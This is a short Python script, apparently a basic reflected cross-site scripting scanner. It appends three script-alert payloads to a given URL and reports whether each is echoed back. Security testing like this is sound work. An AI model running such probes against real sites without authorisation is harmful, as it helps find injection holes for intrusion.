import requests
import sys

# List of XSS payloads
payloads = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>"
]

def test_xss(url):
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if payload in response.text:
            print(f"[+] XSS Found at {test_url}")
        else:
            print(f"[-] No XSS at {test_url}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python xss_detector.py <URL>")
        sys.exit(1)

    target_url = sys.argv[1]
    test_xss(target_url)
